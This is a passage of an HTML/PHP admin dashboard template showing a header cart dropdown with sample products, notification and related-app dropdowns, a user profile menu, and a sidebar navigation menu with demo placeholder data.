                                    </div>
                                  </div>
                                  <div
                                    class="min-w-fit-content d-flex align-items-start justify-content-between"
                                  >
                                    <ul class="header-product-item d-flex">
                                      <li>Decorative</li>
                                    </ul>
                                  </div>
                                </div>
                              </div>
                            </li>
                            <li class="dropdown-item">
                              <div
                                class="d-flex align-items-start cart-dropdown-item"
                              >
                                <img
                                  src="<?php echo base_url('public/admin') ?>/assets/images/ecommerce/jpg/4.jpg"
                                  alt="img"
                                  class="avatar avatar-sm avatar-rounded br-5 me-3"
                                />
                                <div class="flex-grow-1">
                                  <div
                                    class="d-flex align-items-start justify-content-between mb-0"
                                  >
                                    <div
                                      class="mb-0 fs-13 text-dark fw-semibold"
                                    >
                                      <a href="cart.html">Kikon Camera</a>
                                    </div>
                                    <div>
                                      <span class="text-black mb-1"
                                        >$4,999.00</span
                                      >
                                      <a
                                        href="javascript:void(0);"
                                        class="header-cart-remove float-end dropdown-item-close"
                                        ><i class="ti ti-trash"></i
                                      ></a>
                                    </div>
                                  </div>
                                  <div
                                    class="min-w-fit-content d-flex align-items-start justify-content-between"
                                  >
                                    <ul class="header-product-item d-flex">
                                      <li>Black</li>
                                      <li>50MM</li>
                                    </ul>
                                  </div>
                                </div>
                              </div>
                            </li>
                            <li class="dropdown-item">
                              <div
                                class="d-flex align-items-start cart-dropdown-item"
                              >
                                <img
                                  src="<?php echo base_url('public/admin') ?>/assets/images/ecommerce/jpg/6.jpg"
                                  alt="img"
                                  class="avatar avatar-sm avatar-rounded br-5 me-3"
                                />
                                <div class="flex-grow-1">
                                  <div
                                    class="d-flex align-items-start justify-content-between mb-0"
                                  >
                                    <div
                                      class="mb-0 fs-13 text-dark fw-semibold"
                                    >
                                      <a href="cart.html">Canvas Shoes</a>
                                    </div>
                                    <div>
                                      <span class="text-black mb-1"
                                        >$129.00</span
                                      >
                                      <a
                                        href="javascript:void(0);"
                                        class="header-cart-remove float-end dropdown-item-close"
                                        ><i class="ti ti-trash"></i
                                      ></a>
                                    </div>
                                  </div>
                                  <div
                                    class="d-flex align-items-start justify-content-between"
                                  >
                                    <ul class="header-product-item d-flex">
                                      <li>Gray</li>
                                      <li>Sports</li>
                                    </ul>
                                  </div>
                                </div>
                              </div>
                            </li>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div
                      class="simplebar-placeholder"
                      style="width: 0px; height: 0px"
                    ></div>
                  </div>
                  <div
                    class="simplebar-track simplebar-horizontal"
                    style="visibility: hidden"
                  >
                    <div
                      class="simplebar-scrollbar"
                      style="width: 0px; display: none"
                    ></div>
                  </div>
                  <div
                    class="simplebar-track simplebar-vertical"
                    style="visibility: hidden"
                  >
                    <div
                      class="simplebar-scrollbar"
                      style="height: 0px; display: none"
                    ></div>
                  </div>
                </ul>
                <div class="p-3 empty-header-item border-top">
                  <div class="d-grid">
                    <a href="checkout.html" class="btn btn-primary"
                      >Proceed to checkout</a
                    >
                  </div>
                </div>
                <div class="p-5 empty-item d-none">
                  <div class="text-center">
                    <span
                      class="avatar avatar-xl avatar-rounded bg-warning-transparent"
                    >
                      <i class="ri-shopping-cart-2-line fs-2"></i>
                    </span>
                    <h6 class="fw-bold mb-1 mt-3">Your Cart is Empty</h6>
                    <span class="mb-3 fw-normal fs-13 d-block"
                      >Add some items to make me happy :)</span
                    >
                    <a
                      href="products.html"
                      class="btn btn-primary btn-wave btn-sm m-1 waves-effect waves-light"
                      data-abc="true"
                      >continue shopping <i class="bi bi-arrow-right ms-1"></i
                    ></a>
                  </div>
                </div>
              </div>
              <!-- End::main-header-dropdown -->
            </div>
            <!-- End::header-element -->
            <!-- Start::header-element -->
            <div class="header-element notifications-dropdown">
              <!-- Start::header-link|dropdown-toggle -->
              <a
                href="javascript:void(0);"
                class="header-link dropdown-toggle"
                data-bs-toggle="dropdown"
                data-bs-auto-close="outside"
                id="messageDropdown"
                aria-expanded="false"
              >
                <i class="bx bx-bell header-link-icon"></i>
                <span
                  class="badge bg-secondary rounded-pill header-icon-badge pulse pulse-secondary"
                  id="notification-icon-badge"
                  >5</span
                >
              </a>
              <!-- End::header-link|dropdown-toggle -->
              <!-- Start::main-header-dropdown -->
              <div
                class="main-header-dropdown dropdown-menu dropdown-menu-end"
                data-popper-placement="none"
              >
                <div class="p-3">
                  <div
                    class="d-flex align-items-center justify-content-between"
                  >
                    <p class="mb-0 fs-17 fw-semibold">Notifications</p>
                    <span
                      class="badge bg-secondary-transparent"
                      id="notifiation-data"
                      >5 Unread</span
                    >
                  </div>
                </div>
                <div class="dropdown-divider"></div>
                <ul
                  class="list-unstyled mb-0"
                  id="header-notification-scroll"
                  data-simplebar="init"
                >
                  <div class="simplebar-wrapper" style="margin: 0px">
                    <div class="simplebar-height-auto-observer-wrapper">
                      <div class="simplebar-height-auto-observer"></div>
                    </div>
                    <div class="simplebar-mask">
                      <div
                        class="simplebar-offset"
                        style="right: 0px; bottom: 0px"
                      >
                        <div
                          class="simplebar-content-wrapper"
                          tabindex="0"
                          role="region"
                          aria-label="scrollable content"
                          style="height: auto; overflow: hidden"
                        >
                          <div class="simplebar-content" style="padding: 0px">
                            <li class="dropdown-item">
                              <div class="d-flex align-items-start">
                                <div class="pe-2">
                                  <span
                                    class="avatar avatar-md bg-primary-transparent avatar-rounded"
                                    ><i class="ti ti-gift fs-18"></i
                                  ></span>
                                </div>
                                <div
                                  class="flex-grow-1 d-flex align-items-center justify-content-between"
                                >
                                  <div>
                                    <p class="mb-0 fw-semibold">
                                      <a href="notifications.html"
                                        >Your Order Has Been Shipped</a
                                      >
                                    </p>
                                    <span
                                      class="text-muted fw-normal fs-12 header-notification-text"
                                      >Order No: 123456 Has Shipped To Your
                                      Delivery Address</span
                                    >
                                  </div>
                                  <div>
                                    <a
                                      href="javascript:void(0);"
                                      class="min-w-fit-content text-muted me-1 dropdown-item-close1"
                                      ><i class="ti ti-x fs-16"></i
                                    ></a>
                                  </div>
                                </div>
                              </div>
                            </li>
                            <li class="dropdown-item">
                              <div class="d-flex align-items-start">
                                <div class="pe-2">
                                  <span
                                    class="avatar avatar-md bg-secondary-transparent avatar-rounded"
                                    ><i class="ti ti-discount-2 fs-18"></i
                                  ></span>
                                </div>
                                <div
                                  class="flex-grow-1 d-flex align-items-center justify-content-between"
                                >
                                  <div>
                                    <p class="mb-0 fw-semibold">
                                      <a href="notifications.html"
                                        >Discount Available</a
                                      >
                                    </p>
                                    <span
                                      class="text-muted fw-normal fs-12 header-notification-text"
                                      >Discount Available On Selected
                                      Products</span
                                    >
                                  </div>
                                  <div>
                                    <a
                                      href="javascript:void(0);"
                                      class="min-w-fit-content text-muted me-1 dropdown-item-close1"
                                      ><i class="ti ti-x fs-16"></i
                                    ></a>
                                  </div>
                                </div>
                              </div>
                            </li>
                            <li class="dropdown-item">
                              <div class="d-flex align-items-start">
                                <div class="pe-2">
                                  <span
                                    class="avatar avatar-md bg-pink-transparent avatar-rounded"
                                    ><i class="ti ti-user-check fs-18"></i
                                  ></span>
                                </div>
                                <div
                                  class="flex-grow-1 d-flex align-items-center justify-content-between"
                                >
                                  <div>
                                    <p class="mb-0 fw-semibold">
                                      <a href="notifications.html"
                                        >Account Has Been Verified</a
                                      >
                                    </p>
                                    <span
                                      class="text-muted fw-normal fs-12 header-notification-text"
                                      >Your Account Has Been Verified
                                      Sucessfully</span
                                    >
                                  </div>
                                  <div>
                                    <a
                                      href="javascript:void(0);"
                                      class="min-w-fit-content text-muted me-1 dropdown-item-close1"
                                      ><i class="ti ti-x fs-16"></i
                                    ></a>
                                  </div>
                                </div>
                              </div>
                            </li>
                            <li class="dropdown-item">
                              <div class="d-flex align-items-start">
                                <div class="pe-2">
                                  <span
                                    class="avatar avatar-md bg-warning-transparent avatar-rounded"
                                    ><i class="ti ti-circle-check fs-18"></i
                                  ></span>
                                </div>
                                <div
                                  class="flex-grow-1 d-flex align-items-center justify-content-between"
                                >
                                  <div>
                                    <p class="mb-0 fw-semibold">
                                      <a href="notifications.html"
                                        >Order Placed
                                        <span class="text-warning"
                                          >ID: #1116773</span
                                        ></a
                                      >
                                    </p>
                                    <span
                                      class="text-muted fw-normal fs-12 header-notification-text"
                                      >Order Placed Successfully</span
                                    >
                                  </div>
                                  <div>
                                    <a
                                      href="javascript:void(0);"
                                      class="min-w-fit-content text-muted me-1 dropdown-item-close1"
                                      ><i class="ti ti-x fs-16"></i
                                    ></a>
                                  </div>
                                </div>
                              </div>
                            </li>
                            <li class="dropdown-item">
                              <div class="d-flex align-items-start">
                                <div class="pe-2">
                                  <span
                                    class="avatar avatar-md bg-success-transparent avatar-rounded"
                                    ><i class="ti ti-clock fs-18"></i
                                  ></span>
                                </div>
                                <div
                                  class="flex-grow-1 d-flex align-items-center justify-content-between"
                                >
                                  <div>
                                    <p class="mb-0 fw-semibold">
                                      <a href="notifications.html"
                                        >Order Delayed
                                        <span class="text-success"
                                          >ID: 7731116</span
                                        ></a
                                      >
                                    </p>
                                    <span
                                      class="text-muted fw-normal fs-12 header-notification-text"
                                      >Order Delayed Unfortunately</span
                                    >
                                  </div>
                                  <div>
                                    <a
                                      href="javascript:void(0);"
                                      class="min-w-fit-content text-muted me-1 dropdown-item-close1"
                                      ><i class="ti ti-x fs-16"></i
                                    ></a>
                                  </div>
                                </div>
                              </div>
                            </li>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div
                      class="simplebar-placeholder"
                      style="width: 0px; height: 0px"
                    ></div>
                  </div>
                  <div
                    class="simplebar-track simplebar-horizontal"
                    style="visibility: hidden"
                  >
                    <div
                      class="simplebar-scrollbar"
                      style="width: 0px; display: none"
                    ></div>
                  </div>
                  <div
                    class="simplebar-track simplebar-vertical"
                    style="visibility: hidden"
                  >
                    <div
                      class="simplebar-scrollbar"
                      style="height: 0px; display: none"
                    ></div>
                  </div>
                </ul>
                <div class="p-3 empty-header-item1 border-top">
                  <div class="d-grid">
                    <a href="notifications.html" class="btn btn-primary"
                      >View All</a
                    >
                  </div>
                </div>
                <div class="p-5 empty-item1 d-none">
                  <div class="text-center">
                    <span
                      class="avatar avatar-xl avatar-rounded bg-secondary-transparent"
                    >
                      <i class="ri-notification-off-line fs-2"></i>
                    </span>
                    <h6 class="fw-semibold mt-3">No New Notifications</h6>
                  </div>
                </div>
              </div>
              <!-- End::main-header-dropdown -->
            </div>
            <!-- End::header-element -->
            <!-- Start::header-element -->
            <div class="header-element header-shortcuts-dropdown">
              <!-- Start::header-link|dropdown-toggle -->
              <a
                href="javascript:void(0);"
                class="header-link dropdown-toggle"
                data-bs-toggle="dropdown"
                data-bs-auto-close="outside"
                id="notificationDropdown"
                aria-expanded="false"
              >
                <i class="bx bx-grid-alt header-link-icon"></i>
              </a>
              <!-- End::header-link|dropdown-toggle -->
              <!-- Start::main-header-dropdown -->
              <div
                class="main-header-dropdown header-shortcuts-dropdown dropdown-menu pb-0 dropdown-menu-end"
                aria-labelledby="notificationDropdown"
              >
                <div class="p-3">
                  <div
                    class="d-flex align-items-center justify-content-between"
                  >
                    <p class="mb-0 fs-17 fw-semibold">Related Apps</p>
                  </div>
                </div>
                <div class="dropdown-divider mb-0"></div>
                <div
                  class="main-header-shortcuts p-2"
                  id="header-shortcut-scroll"
                  data-simplebar="init"
                >
                  <div class="simplebar-wrapper" style="margin: -8px">
                    <div class="simplebar-height-auto-observer-wrapper">
                      <div class="simplebar-height-auto-observer"></div>
                    </div>
                    <div class="simplebar-mask">
                      <div
                        class="simplebar-offset"
                        style="right: 0px; bottom: 0px"
                      >
                        <div
                          class="simplebar-content-wrapper"
                          tabindex="0"
                          role="region"
                          aria-label="scrollable content"
                          style="height: auto; overflow: hidden"
                        >
                          <div class="simplebar-content" style="padding: 8px">
                            <div class="row g-2">
                              <div class="col-4">
                                <a href="javascript:void(0);">
                                  <div class="text-center p-3 related-app">
                                    <span
                                      class="avatar avatar-sm avatar-rounded"
                                    >
                                      <img
                                        src="<?php echo base_url('public/admin') ?>/assets/images/apps/figma.png"
                                        alt=""
                                      />
                                    </span>
                                    <span class="d-block fs-12">Figma</span>
                                  </div>
                                </a>
                              </div>
                              <div class="col-4">
                                <a href="javascript:void(0);">
                                  <div class="text-center p-3 related-app">
                                    <span
                                      class="avatar avatar-sm avatar-rounded"
                                    >
                                      <img
                                        src="<?php echo base_url('public/admin') ?>/assets/images/apps/microsoft-powerpoint.png"
                                        alt=""
                                      />
                                    </span>
                                    <span class="d-block fs-12"
                                      >Power Point</span
                                    >
                                  </div>
                                </a>
                              </div>
                              <div class="col-4">
                                <a href="javascript:void(0);">
                                  <div class="text-center p-3 related-app">
                                    <span
                                      class="avatar avatar-sm avatar-rounded"
                                    >
                                      <img
                                        src="<?php echo base_url('public/admin') ?>/assets/images/apps/microsoft-word.png"
                                        alt=""
                                      />
                                    </span>
                                    <span class="d-block fs-12">MS Word</span>
                                  </div>
                                </a>
                              </div>
                              <div class="col-4">
                                <a href="javascript:void(0);">
                                  <div class="text-center p-3 related-app">
                                    <span
                                      class="avatar avatar-sm avatar-rounded"
                                    >
                                      <img
                                        src="<?php echo base_url('public/admin') ?>/assets/images/apps/calender.png"
                                        alt=""
                                      />
                                    </span>
                                    <span class="d-block fs-12">Calendar</span>
                                  </div>
                                </a>
                              </div>
                              <div class="col-4">
                                <a href="javascript:void(0);">
                                  <div class="text-center p-3 related-app">
                                    <span
                                      class="avatar avatar-sm avatar-rounded"
                                    >
                                      <img
                                        src="<?php echo base_url('public/admin') ?>/assets/images/apps/sketch.png"
                                        alt=""
                                      />
                                    </span>
                                    <span class="d-block fs-12">Sketch</span>
                                  </div>
                                </a>
                              </div>
                              <div class="col-4">
                                <a href="javascript:void(0);">
                                  <div class="text-center p-3 related-app">
                                    <span
                                      class="avatar avatar-sm avatar-rounded"
                                    >
                                      <img
                                        src="<?php echo base_url('public/admin') ?>/assets/images/apps/google-docs.png"
                                        alt=""
                                      />
                                    </span>
                                    <span class="d-block fs-12">Docs</span>
                                  </div>
                                </a>
                              </div>
                              <div class="col-4">
                                <a href="javascript:void(0);">
                                  <div class="text-center p-3 related-app">
                                    <span
                                      class="avatar avatar-sm avatar-rounded"
                                    >
                                      <img
                                        src="<?php echo base_url('public/admin') ?>/assets/images/apps/google.png"
                                        alt=""
                                      />
                                    </span>
                                    <span class="d-block fs-12">Google</span>
                                  </div>
                                </a>
                              </div>
                              <div class="col-4">
                                <a href="javascript:void(0);">
                                  <div class="text-center p-3 related-app">
                                    <span
                                      class="avatar avatar-sm avatar-rounded"
                                    >
                                      <img
                                        src="<?php echo base_url('public/admin') ?>/assets/images/apps/translate.png"
                                        alt=""
                                      />
                                    </span>
                                    <span class="d-block fs-12">Translate</span>
                                  </div>
                                </a>
                              </div>
                              <div class="col-4">
                                <a href="javascript:void(0);">
                                  <div class="text-center p-3 related-app">
                                    <span
                                      class="avatar avatar-sm avatar-rounded"
                                    >
                                      <img
                                        src="<?php echo base_url('public/admin') ?>/assets/images/apps/google-sheets.png"
                                        alt=""
                                      />
                                    </span>
                                    <span class="d-block fs-12">Sheets</span>
                                  </div>
                                </a>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div
                      class="simplebar-placeholder"
                      style="width: 0px; height: 0px"
                    ></div>
                  </div>
                  <div
                    class="simplebar-track simplebar-horizontal"
                    style="visibility: hidden"
                  >
                    <div
                      class="simplebar-scrollbar"
                      style="width: 0px; display: none"
                    ></div>
                  </div>
                  <div
                    class="simplebar-track simplebar-vertical"
                    style="visibility: hidden"
                  >
                    <div
                      class="simplebar-scrollbar"
                      style="height: 0px; display: none"
                    ></div>
                  </div>
                </div>
                <div class="p-3 border-top">
                  <div class="d-grid">
                    <a href="javascript:void(0);" class="btn btn-primary"
                      >View All</a
                    >
                  </div>
                </div>
              </div>
              <!-- End::main-header-dropdown -->
            </div>
            <!-- End::header-element -->
            <!-- Start::header-element -->
            <div class="header-element header-fullscreen">
              <!-- Start::header-link -->
              <a
                onclick="openFullscreen();"
                href="javascript:void(0);"
                class="header-link"
              >
                <i
                  class="bx bx-fullscreen full-screen-open header-link-icon"
                ></i>
                <i
                  class="bx bx-exit-fullscreen full-screen-close header-link-icon d-none"
                ></i>
              </a>
              <!-- End::header-link -->
            </div>
            <!-- End::header-element -->
            <!-- Start::header-element -->
            <div class="header-element">
              <!-- Start::header-link|dropdown-toggle -->
              <a
                href="javascript:void(0);"
                class="header-link dropdown-toggle"
                id="mainHeaderProfile"
                data-bs-toggle="dropdown"
                data-bs-auto-close="outside"
                aria-expanded="false"
              >
                <div class="d-flex align-items-center">
                  <div class="me-sm-2 me-0">
                    <img
                      src="<?php echo base_url('public/admin') ?>/assets/images/faces/9.jpg"
                      alt="img"
                      width="32"
                      height="32"
                      class="rounded-circle"
                    />
                  </div>
                  <div class="d-sm-block d-none">
                    <p class="fw-semibold mb-0 lh-1">Json Taylor</p>
                    <span class="op-7 fw-normal d-block fs-11"
                      >Web Designer</span
                    >
                  </div>
                </div>
              </a>
              <!-- End::header-link|dropdown-toggle -->
              <ul
                class="main-header-dropdown dropdown-menu pt-0 overflow-hidden header-profile-dropdown dropdown-menu-end"
                aria-labelledby="mainHeaderProfile"
              >
                <li>
                  <a class="dropdown-item d-flex" href="profile.html"
                    ><i class="ti ti-user-circle fs-18 me-2 op-7"></i>Profile</a
                  >
                </li>
                <li>
                  <a class="dropdown-item d-flex" href="mail.html"
                    ><i class="ti ti-inbox fs-18 me-2 op-7"></i>Inbox
                    <span class="badge bg-success-transparent ms-auto"
                      >25</span
                    ></a
                  >
                </li>
                <li>
                  <a
                    class="dropdown-item d-flex border-block-end"
                    href="to-do-list.html"
                    ><i class="ti ti-clipboard-check fs-18 me-2 op-7"></i>Task
                    Manager</a
                  >
                </li>
                <li>
                  <a class="dropdown-item d-flex" href="mail-settings.html"
                    ><i class="ti ti-adjustments-horizontal fs-18 me-2 op-7"></i
                    >Settings</a
                  >
                </li>
                <li>
                  <a
                    class="dropdown-item d-flex border-block-end"
                    href="javascript:void(0);"
                    ><i class="ti ti-wallet fs-18 me-2 op-7"></i>Bal:
                    $7,12,950</a
                  >
                </li>
                <li>
                  <a class="dropdown-item d-flex" href="chat.html"
                    ><i class="ti ti-headset fs-18 me-2 op-7"></i>Support</a
                  >
                </li>
                <li>
                  <a class="dropdown-item d-flex" href="sign-in-cover.html"
                    ><i class="ti ti-logout fs-18 me-2 op-7"></i>Log Out</a
                  >
                </li>
              </ul>
            </div>
            <!-- End::header-element -->
            <!-- Start::header-element -->
            <div class="header-element">
              <!-- Start::header-link|switcher-icon -->
              <a
                href="javascript:void(0);"
                class="header-link switcher-icon"
                data-bs-toggle="offcanvas"
                data-bs-target="#switcher-canvas"
              >
                <i class="bx bx-cog header-link-icon"></i>
              </a>
              <!-- End::header-link|switcher-icon -->
            </div>
            <!-- End::header-element -->
          </div>
          <!-- End::header-content-right -->
        </div>
        <!-- End::main-header-container -->
      </header>
      <!-- /app-header -->
      <!-- Start::app-sidebar -->
      <aside class="app-sidebar sticky" id="sidebar">
        <!-- Start::main-sidebar-header -->
        <div class="main-sidebar-header">
          <a href="index.html" class="header-logo">
            <img
              src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/desktop-logo.png"
              alt="logo"
              class="desktop-logo"
            />
            <img
              src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/toggle-logo.png"
              alt="logo"
              class="toggle-logo"
            />
            <img
              src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/desktop-dark.png"
              alt="logo"
              class="desktop-dark"
            />
            <img
              src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/toggle-dark.png"
              alt="logo"
              class="toggle-dark"
            />
            <img
              src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/desktop-white.png"
              alt="logo"
              class="desktop-white"
            />
            <img
              src="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/toggle-white.png"
              alt="logo"
              class="toggle-white"
            />
          </a>
        </div>
        <!-- End::main-sidebar-header -->
        <!-- Start::main-sidebar -->
        <div class="main-sidebar" id="sidebar-scroll" data-simplebar="init">
          <div class="simplebar-wrapper" style="margin: -8px 0px -80px">
            <div class="simplebar-height-auto-observer-wrapper">
              <div class="simplebar-height-auto-observer"></div>
            </div>
            <div class="simplebar-mask">
              <div class="simplebar-offset" style="right: 0px; bottom: 0px">
                <div
                  class="simplebar-content-wrapper"
                  tabindex="0"
                  role="region"
                  aria-label="scrollable content"
                  style="height: 100%; overflow: hidden scroll"
                >
                  <div class="simplebar-content" style="padding: 8px 0px 80px">
                    <!-- Start::nav -->
                    <nav
                      class="main-menu-container nav nav-pills flex-column sub-open"
                    >
                      <div class="slide-left d-none" id="slide-left">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          fill="#7b8191"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                        >
                          <path
                            d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z"
                          ></path>
                        </svg>
                      </div>
                      <ul
                        class="main-menu"
                        style="margin-left: 0px; margin-right: 0px"
                      >
                        <!-- Start::slide__category -->
                        <li class="slide__category">
                          <span class="category-name">Main</span>
                        </li>
                        <!-- End::slide__category -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-home side-menu__icon"></i>
                            <span class="side-menu__label"
                              >Dashboards<span
                                class="badge bg-warning-transparent ms-2"
                                >12</span
                              ></span
                            >
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 148px);
                            "
                            data-popper-placement="bottom"
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Dashboards</a>
                            </li>
                            <li class="slide">
                              <a href="index.html" class="side-menu__item"
                                >CRM</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-1.html" class="side-menu__item"
                                >Ecommerce</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-2.html" class="side-menu__item"
                                >Crypto</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-3.html" class="side-menu__item"
                                >Jobs</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-4.html" class="side-menu__item"
                                >NFT</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-5.html" class="side-menu__item"
                                >Sales</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-6.html" class="side-menu__item"
                                >Analytics</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-7.html" class="side-menu__item"
                                >Projects</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-8.html" class="side-menu__item"
                                >HRM</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-9.html" class="side-menu__item"
                                >Stocks</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-10.html" class="side-menu__item"
                                >Courses</a
                              >
                            </li>
                            <li class="slide">
                              <a href="index-11.html" class="side-menu__item"
                                >Personal</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide__category -->
                        <li class="slide__category">
                          <span class="category-name">Pages</span>
                        </li>
                        <!-- End::slide__category -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-file-blank side-menu__icon"></i>
                            <span class="side-menu__label"
                              >Pages<span
                                class="badge bg-secondary-transparent ms-2"
                                >New</span
                              ></span
                            >
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 229px);
                            "
                            data-popper-placement="bottom"
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Pages</a>
                            </li>
                            <li class="slide">
                              <a href="about-us.html" class="side-menu__item"
                                >About Us</a
                              >
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Blog
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a href="blog.html" class="side-menu__item"
                                    >Blog</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="blog-details.html"
                                    class="side-menu__item"
                                    >Blog Details</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="blog-create.html"
                                    class="side-menu__item"
                                    >Create Blog</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide">
                              <a href="chat.html" class="side-menu__item"
                                >Chat</a
                              >
                            </li>
                            <li class="slide">
                              <a href="contacts.html" class="side-menu__item"
                                >Contacts</a
                              >
                            </li>
                            <li class="slide">
                              <a href="contact-us.html" class="side-menu__item"
                                >Contact Us</a
                              >
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Ecommerce
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="add-products.html"
                                    class="side-menu__item"
                                    >Add Products</a
                                  >
                                </li>
                                <li class="slide">
                                  <a href="cart.html" class="side-menu__item"
                                    >Cart</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="checkout.html"
                                    class="side-menu__item"
                                    >Checkout</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="edit-products.html"
                                    class="side-menu__item"
                                    >Edit Products</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="order-details.html"
                                    class="side-menu__item"
                                    >Order Details</a
                                  >
                                </li>
                                <li class="slide">
                                  <a href="orders.html" class="side-menu__item"
                                    >Orders</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="products.html"
                                    class="side-menu__item"
                                    >Products</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="product-details.html"
                                    class="side-menu__item"
                                    >Product Details</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="products-list.html"
                                    class="side-menu__item"
                                    >Products List</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="wishlist.html"
                                    class="side-menu__item"
                                    >Wishlist</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Email
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a href="mail.html" class="side-menu__item"
                                    >Mail App</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="mail-settings.html"
                                    class="side-menu__item"
                                    >Mail Settings</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide">
                              <a href="empty.html" class="side-menu__item"
                                >Empty</a
                              >
                            </li>
                            <li class="slide">
                              <a href="faq's.html" class="side-menu__item"
                                >FAQ's</a
                              >
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >File Manager
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="file-manager.html"
                                    class="side-menu__item"
                                    >File Manager</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Invoice
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="invoice-create.html"
                                    class="side-menu__item"
                                    >Create Invoice</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="invoice-details.html"
                                    class="side-menu__item"
                                    >Invoice Details</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="invoice-list.html"
                                    class="side-menu__item"
                                    >Invoice List</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide">
                              <a href="landing.html" class="side-menu__item"
                                >Landing</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="landing-jobs.html"
                                class="side-menu__item"
                                >Jobs Landing<span
                                  class="badge bg-secondary-transparent ms-2"
                                  >New</span
                                ></a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="notifications.html"
                                class="side-menu__item"
                                >Notifications</a
                              >
                            </li>
                            <li class="slide">
                              <a href="pricing.html" class="side-menu__item"
                                >Pricing</a
                              >
                            </li>
                            <li class="slide">
                              <a href="profile.html" class="side-menu__item"
                                >Profile</a
                              >
                            </li>
                            <li class="slide">
                              <a href="reviews.html" class="side-menu__item"
                                >Reviews</a
                              >
                            </li>
                            <li class="slide">
                              <a href="team.html" class="side-menu__item"
                                >Team</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="terms_conditions.html"
                                class="side-menu__item"
                                >Terms &amp; Conditions</a
                              >
                            </li>
                            <li class="slide">
                              <a href="timeline.html" class="side-menu__item"
                                >Timeline</a
                              >
                            </li>
                            <li class="slide">
                              <a href="to-do-list.html" class="side-menu__item"
                                >To Do List</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-task side-menu__icon"></i>
                            <span class="side-menu__label"
                              >Task<span
                                class="badge bg-secondary-transparent ms-2"
                                >New</span
                              ></span
                            >
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 271px);
                            "
                            data-popper-placement="bottom"
                          >
